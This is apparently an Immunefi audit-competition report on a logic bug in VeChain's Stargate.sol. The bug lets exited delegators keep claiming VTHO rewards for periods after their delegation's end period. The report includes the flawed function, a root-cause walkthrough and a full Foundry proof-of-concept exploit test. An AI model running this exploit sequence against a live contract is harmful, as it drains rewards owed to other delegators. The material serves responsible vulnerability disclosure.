# 60431 sc high unauthorized vtho reward claims after delegation exit

**Submitted on Nov 22nd 2025 at 14:38:45 UTC by @Dliteofficial for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #60431
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:**
  * Protocol insolvency
  * Theft of unclaimed yield

## Description

## Brief/Intro

A critical vulnerability in the `_claimableDelegationPeriods()` function allows users who have exited their delegation to continually claim VTHO rewards for periods occurring after their delegation has ended. When a user requests delegation exit, claims all rewards up to their `endPeriod`, and then waits for the validator to complete additional periods, the function incorrectly returns claimable periods extending beyond the `endPeriod` up to the current `completedPeriods`. This enables unauthorized reward extraction from the Stargate contract's VTHO reserves, potentially draining funds that should belong to active delegators or the protocol.

## Vulnerability Details

The Stargate contract manages delegation rewards through a period-based system where users can stake VET, delegate to validators, and claim VTHO rewards proportional to their effective stake during active delegation periods. When users request to exit their delegation via `requestDelegationExit()`, the protocol sets an `endPeriod` marking when their delegation terminates. Users should only be able to claim rewards for periods up to and including this `endPeriod`.

The vulnerability exists in the `_claimableDelegationPeriods()` function of `Stargate.sol`. This function determines which periods a user can claim rewards for by returning a tuple `(firstClaimablePeriod, lastClaimablePeriod)`. The function implements two main conditional branches:

```solidity
function _claimableDelegationPeriods(
    StargateStorage storage $,
    uint256 _tokenId
) private view returns (uint32, uint32) {
    // ... validation checks ...
    
    (uint32 startPeriod, uint32 endPeriod) = 
        $.protocolStakerContract.getDelegationPeriodDetails(delegationId);
    (, , , uint32 completedPeriods) = $.protocolStakerContract.getValidationPeriodDetails(validator);
    
    uint32 currentValidatorPeriod = completedPeriods + 1;
    uint32 nextClaimablePeriod = $.lastClaimedPeriod[_tokenId] + 1;
    
    // Condition 1: Handle exit case when endPeriod is set and exit is fulfilled
    if (
        endPeriod != type(uint32).max &&
        endPeriod < currentValidatorPeriod &&
        endPeriod > nextClaimablePeriod
    ) {
        return (nextClaimablePeriod, endPeriod);
    }
    
    // Condition 2: Handle active delegations or when exit condition above fails
>>  if (nextClaimablePeriod < currentValidatorPeriod) {
>>      return (nextClaimablePeriod, completedPeriods);
>>  }
    
    return (0, 0);
}
```

The root cause lies in Condition 2. When a user has exited their delegation and claimed all rewards up to `endPeriod`, the following scenario occurs:

1. User requests exit, setting `endPeriod = completedPeriods + 1` (e.g., `endPeriod = 11` when `completedPeriods = 10`)
2. User claims all rewards up to `endPeriod`, setting `lastClaimedPeriod[_tokenId] = endPeriod` (e.g., `11`)
3. Time passes, validator completes more periods (e.g., `completedPeriods` advances to `50`)
4. User calls `claimRewards()` again, which invokes `_claimableDelegationPeriods()`

At this point:

* `nextClaimablePeriod = lastClaimedPeriod[_tokenId] + 1 = endPeriod + 1` (e.g., `12`)
* `currentValidatorPeriod = completedPeriods + 1` (e.g., `51`)
* `endPeriod < currentValidatorPeriod` is true (`11 < 51`)
* `endPeriod > nextClaimablePeriod` is false (`11 > 12` is false)

Since Condition 1 fails (specifically, `endPeriod > nextClaimablePeriod` evaluates to false), execution falls through to Condition 2. Condition 2 only checks `nextClaimablePeriod < currentValidatorPeriod` without validating whether the delegation has exited or whether `nextClaimablePeriod` exceeds `endPeriod`. Consequently, it returns `(endPeriod + 1, completedPeriods)` (e.g., `(12, 50)`), allowing the user to claim rewards for periods 12 through 50, even though their delegation ended at period 11.

The `_claimableRewardsForPeriod()` function calculates rewards for a given period without validating that the period is within the delegation's active range (`period <= endPeriod`). It retrieves the validator's total rewards for that period and calculates the user's share based on their effective stake, which may still exist in the system's checkpoints even after exit. This enables the unauthorized reward calculation.

The `_getDelegationStatus()` function correctly identifies exited delegations when `delegationEndPeriod < currentValidatorPeriod`, but this status check is not utilized in `_claimableDelegationPeriods()` to prevent claims after exit.

## Impact Details

**Critical Impact - Unauthorized VTHO Extraction**: Users who have exited their delegations can continually claim VTHO rewards for periods occurring after their delegation has ended as long as they do not unstake and remain in the EXITED delegation state. The severity increases with time, as the gap between `endPeriod` and `completedPeriods` grows, allowing extraction of rewards for an unbounded number of periods.

**Financial Impact**: The exploit allows draining VTHO from the Stargate contract that should belong to:

* Active delegators who maintained their stake during those periods
* The protocol's reward reserves

The maximum loss depends on:

* The number of users who exit and exploit this vulnerability
* The time elapsed between exit and exploitation (more time = more periods = more rewards)
* The validator's reward generation rate during the exploited periods

## Link to Proof of Concept

<https://gist.github.com/Dliteofficial/336c5d14121945cb74deae3af287cc54>

## Proof of Concept

## Proof of Concept

```solidity
/**
     * @notice Test for unauthorized reward claims after delegation exit
     * @dev This test demonstrates the vulnerability where users can claim VTHO rewards
     *      for periods after their delegation has ended.
     * 
     * Vulnerability: When a user exits delegation, claims all rewards up to endPeriod,
     * and then calls claimRewards() after completedPeriods significantly exceeds endPeriod
     * (condition: lastClaimedPeriod = endPeriod, completedPeriods > endPeriod, 
     * endPeriod < currentValidatorPeriod), the _claimableDelegationPeriods() function 
     * returns (endPeriod + 1, completedPeriods) instead of capping the lastClaimablePeriod 
     * at endPeriod. Since Condition 2 only checks if nextClaimablePeriod < 
     * currentValidatorPeriod without validating against endPeriod when exit is fulfilled, 
     * and _claimableRewardsForPeriod() does not validate that period <= endPeriod, users 
     * can claim VTHO rewards for periods after their delegation ended, resulting in 
     * unauthorized reward claims.
     * 
     * Scenario:
     * 1. Multiple users stake and delegate NFTs to validator (to maintain some validator effective stake)
     * 2. Attacker (user) requests delegation exit (endPeriod is set to completedPeriods + 1, e.g., 11)
     * 3. Advance periods so attacker's delegation becomes EXITED (completedPeriods > endPeriod)
     * 4. Attacker claims all rewards up to endPeriod (lastClaimedPeriod = 11)
     * 5. Other users remain delegated, maintaining validator effective stake for future periods
     * 6. Advance periods significantly beyond endPeriod (completedPeriods = 50)
     * 7. Attacker calls claimRewards() again - should NOT be able to claim, but can claim
     *    rewards for periods 12-50 even though delegation ended at period 11
     * 
     */
    function test_UnauthorizedRewardClaimsAfterDelegationExit() public {
        // Step 0: Add validator to ProtocolStaker
        protocolStaker.addValidation{value: 0}(validator, PERIOD_SIZE);
        
        // Step 1: Multiple users stake and delegate NFTs to validator
        // This ensures the validator maintains effective stake even after attacker exits
        uint256 stakeAmount = 1 ether;
        
        // Attacker stakes and delegates
        vm.prank(user);
        uint256 attackerTokenId = stargate.stake{value: stakeAmount}(LEVEL_ID);
        emit log_named_uint("Attacker Token ID", attackerTokenId);
        
        vm.prank(user);
        stargate.delegate(attackerTokenId, validator);
        
        // Other users stake and delegate (to maintain validator effective stake)
        vm.prank(user2);
        uint256 user2TokenId = stargate.stake{value: stakeAmount}(LEVEL_ID);
        emit log_named_uint("User2 Token ID", user2TokenId);
        
        vm.prank(user2);
        stargate.delegate(user2TokenId, validator);
        
        vm.prank(user3);
        uint256 user3TokenId = stargate.stake{value: stakeAmount}(LEVEL_ID);
        emit log_named_uint("User3 Token ID", user3TokenId);
        
        vm.prank(user3);
        stargate.delegate(user3TokenId, validator);
        
        // Step 2: Set validator completed periods to make all delegations ACTIVE
        uint32 initialCompletedPeriods = 0;
        protocolStaker.helper__setValidationCompletedPeriods(validator, initialCompletedPeriods);
        protocolStaker.helper__setValidatorStatus(validator, ProtocolStakerMock.ValidatorStatus.ACTIVE);
        
        uint32 completedPeriods = 10;
        protocolStaker.helper__setValidationCompletedPeriods(validator, completedPeriods);
        
        // Verify all delegations are ACTIVE
        IStargate.Delegation memory attackerDelegation = stargate.getDelegationDetails(attackerTokenId);
        IStargate.Delegation memory user2Delegation = stargate.getDelegationDetails(user2TokenId);
        IStargate.Delegation memory user3Delegation = stargate.getDelegationDetails(user3TokenId);
        assertEq(uint8(attackerDelegation.status), DELEGATION_STATUS_ACTIVE, "Attacker delegation should be ACTIVE");
        assertEq(uint8(user2Delegation.status), DELEGATION_STATUS_ACTIVE, "User2 delegation should be ACTIVE");
        assertEq(uint8(user3Delegation.status), DELEGATION_STATUS_ACTIVE, "User3 delegation should be ACTIVE");
        emit log_named_uint("All delegations are ACTIVE", uint8(attackerDelegation.status));
        
        // Get effective stakes
        uint256 attackerEffectiveStake = stargate.getEffectiveStake(attackerTokenId);
        uint256 user2EffectiveStake = stargate.getEffectiveStake(user2TokenId);
        uint256 user3EffectiveStake = stargate.getEffectiveStake(user3TokenId);
        emit log_named_uint("Attacker effective stake", attackerEffectiveStake);
        emit log_named_uint("User2 effective stake", user2EffectiveStake);
        emit log_named_uint("User3 effective stake", user3EffectiveStake);
        
        // Step 3: Attacker requests delegation exit
        // This sets endPeriod to completedPeriods + 1 = 11
        vm.prank(user);
        stargate.requestDelegationExit(attackerTokenId);
        
        // Get delegation period details to verify endPeriod
        (uint32 startPeriod, uint32 endPeriod) = protocolStaker.getDelegationPeriodDetails(
            stargate.getDelegationDetails(attackerTokenId).delegationId
        );
        emit log_named_uint("Attacker start period", startPeriod);
        emit log_named_uint("Attacker end period (after exit request)", endPeriod);
        assertEq(endPeriod, completedPeriods + 1, "End period should be completedPeriods + 1");
        
        // Step 4: Advance periods so attacker's delegation becomes EXITED
        // Need completedPeriods + 1 > endPeriod, so completedPeriods > 10
        uint32 newCompletedPeriods = completedPeriods + 1; // completedPeriods = 11, currentPeriod = 12 > endPeriod = 11
        protocolStaker.helper__setValidationCompletedPeriods(validator, newCompletedPeriods);
        
        // Verify attacker's delegation is EXITED (but other users remain ACTIVE)
        attackerDelegation = stargate.getDelegationDetails(attackerTokenId);
        user2Delegation = stargate.getDelegationDetails(user2TokenId);
        user3Delegation = stargate.getDelegationDetails(user3TokenId);
        assertEq(uint8(attackerDelegation.status), DELEGATION_STATUS_EXITED, "Attacker delegation should be EXITED");
        assertEq(uint8(user2Delegation.status), DELEGATION_STATUS_ACTIVE, "User2 delegation should remain ACTIVE");
        assertEq(uint8(user3Delegation.status), DELEGATION_STATUS_ACTIVE, "User3 delegation should remain ACTIVE");
        emit log_named_uint("Attacker delegation status after advancing periods", uint8(attackerDelegation.status));
        
        // Verify validator still has effective stake from other users
        uint32 periodToCheck = newCompletedPeriods + 2;
        uint256 validatorEffectiveStake = stargate.getDelegatorsEffectiveStake(validator, periodToCheck);
        emit log_named_uint("Validator effective stake (includes User2 and User3)", validatorEffectiveStake);
        assertGt(validatorEffectiveStake, 0, "Validator should have effective stake from other users");
        
        // Step 5: Attacker claims all rewards up to endPeriod
        // Get claimable periods - should be from startPeriod to endPeriod
        (uint32 firstClaimablePeriod, uint32 lastClaimablePeriod) = stargate.claimableDelegationPeriods(attackerTokenId);
        emit log_named_uint("First claimable period (before first claim)", firstClaimablePeriod);
        emit log_named_uint("Last claimable period (before first claim)", lastClaimablePeriod);
        
        // Verify that lastClaimablePeriod is capped at endPeriod
        assertEq(lastClaimablePeriod, endPeriod, "Last claimable period should be capped at endPeriod");
        
        // Get VTHO balance before claiming
        uint256 vthoBalanceBeforeFirstClaim = vthoToken.balanceOf(user);
        emit log_named_uint("Attacker VTHO balance before first claim", vthoBalanceBeforeFirstClaim);
        
        // Claim rewards up to endPeriod
        vm.prank(user);
        stargate.claimRewards(attackerTokenId);
        
        uint256 vthoBalanceAfterFirstClaim = vthoToken.balanceOf(user);
        emit log_named_uint("Attacker VTHO balance after first claim", vthoBalanceAfterFirstClaim);
        uint256 firstClaimAmount = vthoBalanceAfterFirstClaim - vthoBalanceBeforeFirstClaim;
        emit log_named_uint("First claim amount", firstClaimAmount);
        
        // After claiming up to endPeriod, nextClaimablePeriod should be endPeriod + 1
        // But since endPeriod < currentValidatorPeriod and endPeriod is NOT > nextClaimablePeriod,
        // the condition at line 920-925 fails, and it falls through to line 930
        // This is the bug - it should return (0, 0) or cap at endPeriod, but instead returns
        // (endPeriod + 1, completedPeriods)
        
        // Step 6: Advance periods significantly beyond endPeriod
        // This simulates time passing after the delegation has ended
        // Other users remain delegated, so validator continues to accumulate rewards
        uint32 farCompletedPeriods = 50; // Much larger than endPeriod (11)
        protocolStaker.helper__setValidationCompletedPeriods(validator, farCompletedPeriods);
        
        // Verify other users are still active and validator has effective stake
        user2Delegation = stargate.getDelegationDetails(user2TokenId);
        user3Delegation = stargate.getDelegationDetails(user3TokenId);
        assertEq(uint8(user2Delegation.status), DELEGATION_STATUS_ACTIVE, "User2 delegation should remain ACTIVE");
        assertEq(uint8(user3Delegation.status), DELEGATION_STATUS_ACTIVE, "User3 delegation should remain ACTIVE");
        
        uint256 validatorEffectiveStakeAfterAdvance = stargate.getDelegatorsEffectiveStake(validator, farCompletedPeriods);
        emit log_named_uint("Validator effective stake after advancing far", validatorEffectiveStakeAfterAdvance);
        assertGt(validatorEffectiveStakeAfterAdvance, 0, "Validator should still have effective stake from other users");
        
        // Step 7: Check claimable periods - THIS IS THE BUG
        // Expected: (0, 0) or at most (endPeriod + 1, endPeriod) - should NOT allow claiming beyond endPeriod
        // Actual: (endPeriod + 1, completedPeriods) = (12, 50) - allows claiming for periods 12-50!
        (firstClaimablePeriod, lastClaimablePeriod) = stargate.claimableDelegationPeriods(attackerTokenId);
        emit log_named_uint("First claimable period (BUG - should be 0 or capped)", firstClaimablePeriod);
        emit log_named_uint("Last claimable period (BUG - should be 0 or capped at endPeriod)", lastClaimablePeriod);
        
        // The bug: lastClaimablePeriod should be at most endPeriod (11), but it's completedPeriods (50)
        assertGt(lastClaimablePeriod, endPeriod, "BUG: Last claimable period exceeds endPeriod!");
        assertEq(firstClaimablePeriod, endPeriod + 1, "First claimable period should be endPeriod + 1");
        assertEq(lastClaimablePeriod, farCompletedPeriods, "Last claimable period should equal completedPeriods (BUG)");
        
        // Step 8: Attacker can claim rewards for periods after delegation ended - THE EXPLOIT
        uint256 vthoBalanceBeforeExploit = vthoToken.balanceOf(user);
        uint256 stargateVthoBalanceBeforeExploit = vthoToken.balanceOf(address(stargate));
        emit log_named_uint("Attacker VTHO balance before exploit", vthoBalanceBeforeExploit);
        emit log_named_uint("Stargate VTHO balance before exploit", stargateVthoBalanceBeforeExploit);
        
        // Calculate how much should be claimable (for periods 12-50, which is 39 periods)
        // Since other users are still delegated, there will be rewards available
        uint256 claimableRewards = stargate.claimableRewards(attackerTokenId);
        emit log_named_uint("Claimable rewards for periods after endPeriod", claimableRewards);
        
        // The attacker should NOT be able to claim anything, but due to the bug, they can
        assertGt(claimableRewards, 0, "BUG: Attacker can claim rewards for periods after delegation ended!");
        
        // Claim the unauthorized rewards
        vm.prank(user);
        stargate.claimRewards(attackerTokenId);
        
        uint256 vthoBalanceAfterExploit = vthoToken.balanceOf(user);
        uint256 stargateVthoBalanceAfterExploit = vthoToken.balanceOf(address(stargate));
        uint256 exploitAmount = vthoBalanceAfterExploit - vthoBalanceBeforeExploit;
        
        emit log_named_uint("Attacker VTHO balance after exploit", vthoBalanceAfterExploit);
        emit log_named_uint("Stargate VTHO balance after exploit", stargateVthoBalanceAfterExploit);
        emit log_named_uint("Unauthorized rewards claimed (EXPLOIT)", exploitAmount);
        
        // Verify that the attacker received unauthorized rewards
        assertGt(exploitAmount, 0, "Attacker should have received unauthorized rewards");
        assertEq(
            stargateVthoBalanceAfterExploit,
            stargateVthoBalanceBeforeExploit - exploitAmount,
            "Stargate VTHO balance should decrease by exploit amount"
        );
        
        // Step 9: Verify the periods that were claimed
        // The attacker claimed rewards for periods 12-50, even though their delegation ended at period 11
        // This demonstrates the vulnerability - users can drain VTHO from the contract
        emit log_named_uint("Periods claimed unauthorized", lastClaimablePeriod - firstClaimablePeriod + 1);
        emit log_named_string("VULNERABILITY CONFIRMED", "Attacker claimed rewards for periods after delegation ended");
        
        // Additional verification: Check that the attacker's effective stake is still recorded
        // even though they exited, allowing them to claim rewards they shouldn't be able to
        uint256 attackerEffectiveStakeAfterExit = stargate.getEffectiveStake(attackerTokenId);
        emit log_named_uint("Attacker effective stake (still exists after exit)", attackerEffectiveStakeAfterExit);
        assertGt(attackerEffectiveStakeAfterExit, 0, "Attacker's effective stake still exists, enabling the exploit");

        vthoBalanceAfterExploit = vthoToken.balanceOf(user);
        emit log_named_uint("Attacker VTHO balance after exploit", vthoBalanceAfterExploit);
    }
```
